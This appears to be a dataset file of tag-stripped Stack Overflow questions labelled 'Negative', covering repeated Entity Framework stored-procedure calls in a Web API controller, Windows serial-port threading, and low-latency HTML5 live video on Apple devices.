Negative 13613 pOkay, I know my question may sound like something that has been asked many many times before, but this is slightly different.  At least I could not find the same question but a lot of similar, but not quite the same, questions.p  pI am NOT asking how to work with multiple results from a stored procedure call, nor how to call multiple stored procedures.p  pWhat I would like to know is... strongHow do I call a stored procedure multiple times, combine the result from each call, and return the combined result with Entity FrameworkWeb APIstrongp  pp  pThe below are more details on what I want to do, why I want to do it, what I have tried, and code samplesp  pI have a OData web service, which has a function action, which calls a stored procedure.  Since a web service call is a relatively expensive operation, I want to allow users to make one web service call, which will call the stored procedure multiple times for the user and return a combined results.p  pHeres a function in my Controller class, for a single web service call for a single stored procedure invocation scenario.  It works out fine.p  precode    public IHttpActionResult GetMorgagetDetailODataActionParameters parameters               Set up the parameters for the stored procedure         SqlParameter[] sqlparams         sqlparams  new SqlParameter[2]          sqlparams[0]  new SqlParameterName, System.Data.SqlDbType.Char, 10         sqlparams[0].Value  parameters[Name].ToString          sqlparams[1]  new SqlParameterAddress, System.Data.SqlDbType.VarChar, 100         sqlparams[1].Value  parameters[Address].ToString           Call the stored procedure         var result  this.context.Database.SqlQueryltEntities.MortgateDetailgtdbo.spGetMortgageDetail Name, Address, sqlparams          return Okresult      codepre  pLike I said, however, I would like to enable users to pass in multiple values in one of the parameters Address in this case and have the web service function call the same stored procedure, but multiple times with a different Address value for each call.  Heres an implementation I tried and am having an issue withp  precode    public IHttpActionResult GetMultipleMorgagetDetailODataActionParameters parameters              var response  new ListltEntities.MortgateDetailgt           Set up the parameters for the stored procedure         SqlParameter[] sqlparams         sqlparams  new SqlParameter[2]          sqlparams[0]  new SqlParameterName, System.Data.SqlDbType.Char, 10         sqlparams[0].Value  parameters[Name].ToString          sqlparams[1]  new SqlParameterAddress, System.Data.SqlDbType.VarChar, 100          var addresses  parameters[Addresses] as IEnumerableltstringgt         foreach string address in addresses                      sqlparams[1].Value  address             var result  this.context.Database.SqlQueryltEntities.MortgateDetailgtdbo.spGetMortgageDetail Name, Address, sqlparams              response.Addresult.FirstOrDefaultltEntities.MortgateDetailgt                   return Okresponse      codepre  pWhat I am trying to do is to get a single row First or Default  the sp will always return only one row, by the way from the returned result, and add that to a List that I created of type Entities.MortgateDetail.  And I am doing this in iterations, so I get a single row for each iteration each call and add it to my List colleciton, and then once Im done with the iteration I would return the List.p  pFor whatever reason, it seems like it does not want to get a single row from the returned result and add it to my List.  I dont know what I am doing wrong here...  I obviously tried a many different variations.. and among them I had the code just return a single row from the result like followingp  precode    public IHttpActionResult GetMultipleMorgagetDetailODataActionParameters parameters               Set up the parameters for the stored procedure         SqlParameter[] sqlparams         sqlparams  new SqlParameter[2]          sqlparams[0]  new SqlParameterName, System.Data.SqlDbType.Char, 10         sqlparams[0].Value  parameters[Name].ToString          sqlparams[1]  new SqlParameterAddress, System.Data.SqlDbType.VarChar, 100          var addresses  parameters[Addresses] as IEnumerableltstringgt         foreach string name in addresses                      sqlparams[1].Value  name             var result  this.context.Database.SqlQueryltEntities.MortgateDetailgtdbo.spGetMortgageDetail Name, Address, sqlparams              return Okresult.FirstOrDefault                   return Ok      codepre  pAnd, it worked okay.  Well, obviously not what I want to do and I dont think the code makes much sense, either, but nonetheless it didnt throw any runtime error.  So, its as if result.FirstOrDefault will give me an error anywhere else but when its used for returning a value from the method...p  pCan anyone see what I am doing wrongp  pThank you in advancep  pp  pUPDATESp  pThis is reqlly werid...  After a little more investigation, Ive found out that the error is thrown when it tries to call Database.SqlQuery more than once.p  pSo, as long as I only call the sp once, then everything is okay.  However, the second time I am trying to call the sp, it craps out p  pThe following code will throw an error.  On SQL Profiler, I will only see one sp callp  precode    public IHttpActionResult GetMorgagetDetailODataActionParameters parameters               Set up the parameters for the stored procedure         SqlParameter[] sqlparams         sqlparams  new SqlParameter[2]          sqlparams[0]  new SqlParameterName, System.Data.SqlDbType.Char, 10         sqlparams[0].Value  parameters[Name].ToString          sqlparams[1]  new SqlParameterAddress, System.Data.SqlDbType.VarChar, 100         sqlparams[1].Value  parameters[Address].ToString           Call the stored procedure twice         var result  this.context.Database.SqlQueryltEntities.MortgateDetailgtdbo.spGetMortgageDetail Name, Address, sqlparams         result  this.context.Database.SqlQueryltEntities.MortgateDetailgtdbo.spGetMortgageDetail Name, Address, sqlparams          return Okresult      codepre  pI think the sp is not actually called when I am calling it, but the framework does some kind of queueing the sp call and calls it when it thinks is the best time to do it or something, and while its doing that it screws up something and as a result I cannot make two or multiple successive calls to the same sp right after one another....p  pI know none of this makes much sense, but I really dont see logical flaw in my code.  I am not going to share all the different variations of the code I tried during my investigation, but at one point I hardcoded everything and made my routine just call the sp back to back, and it crapped out.p  pOne interesting observation I had was, when calling the sp twice, if I use to separate variables for the result say result1 and result2, and only return one of the variables return Okresult1  or return Okresult2 then no error is thrown.  However, on the Profiler, I can see only one sp call was made, which was for the result that my function returned.p  pIn other words, even though I had a line that calls the sp and assigns the returned result to a variale in my code, that actually doesnt get executed all the way to actually calling the sp, unless my code actually uses the result i.e. returning it.  Thats why I suspect the framework does some kind of traffic controlling and decides when to inovke the sp on the backend... which apparently has some bug.p  pI tried to find if theres a way to force the framework to commit the database transaction  sp calling, or flushing out the results so that the second time calling the same sp will be just like calling it for the first time, I could not find anything.p  pArggggggp

Negative 13613 pIm trying to write program which should transmit and recieve data through the COMserial port in the asynchronous mode. I use windows API for this purpose.  There are 2 threads  reader is waiting for message, then it resumes another one, writer, which sends answer and then sleeps and so on.

Negative 13613 pSo as far as I understand it, there is no way yet to play live video streams using strongHTML5 videostrong on your Apple device and have strong11.5strong second latency or less.  The only streaming protocol Apple seems to support is strongHLSstrong and it involves dividing video to chunks, downloading them one by one, and having downloaded enough pieces strong3strong by default start playing it. If each of these pieces is strong3strong seconds long, then you are looking at strong910strong second latency. Reducing the length of the piece causes constant disruption when streaming and reducing bitrate of the video doesnt seem to reduce the said marker. p  pIs there any other viable solution for streaming emtrulyem live video using HTML5 on Apple mobile devicesp
